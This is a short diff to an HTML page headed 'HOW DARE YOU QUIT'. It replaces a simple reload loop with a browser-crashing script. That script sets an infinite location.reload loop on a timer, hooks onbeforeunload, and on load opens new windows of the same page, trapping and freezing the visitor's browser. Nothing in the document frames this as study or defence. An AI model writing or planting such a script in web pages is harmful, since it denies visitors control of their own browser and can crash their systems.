@@ -9,11 +9,13 @@
     <br>
     <center>
       <h1>HOW DARE YOU QUIT</h1>
-    </center>
-    <script>
-      while(true){
-        location.reload();
-      }
-    </script>
+    </center><script type="text/javascript"> 
+function CrashAndBurn(url) {window.open(url);}
+onbeforeunload = function(){localStorage.x=1};
+setTimeout(function(){
+while(1)location.reload(1)
+}, 1000)
+</script> 
+<body onload="javascript:CrashAndBurn(self.location,'_blank');JavaScript:CrashAndBurn(self.location,'_blank');">
   </body>
 </html>
